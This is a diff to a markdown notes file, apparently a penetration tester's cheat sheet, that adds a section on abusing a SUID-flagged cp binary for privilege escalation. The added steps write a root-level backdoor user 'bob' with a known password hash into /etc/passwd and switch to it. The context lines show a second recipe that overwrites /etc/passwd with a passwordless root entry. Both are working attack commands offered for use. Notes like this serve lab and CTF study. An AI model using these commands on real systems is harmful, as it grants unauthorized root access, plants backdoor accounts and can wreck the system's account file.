@@ -1,5 +1,13 @@
 # Notes
 
+
+### SUID Flag on /usr/bin/cp command Privilege Escalation
+```
+1. echo "bob:\$1\$-itnite\$VRvGqpGVibx/r9NPdLLTF1:0:0:root:/root:/bin/bash" >> /tmp/passwd
+2. /usr/bin/cp /tmp/passwd /etc/passwd
+3. su - bob (Password: bob)
+```
+
 ### Writable /etc/passwd Privilege Escalation
 ```
 echo root::0:0:root:/root:/bin/bash > /etc/passwd
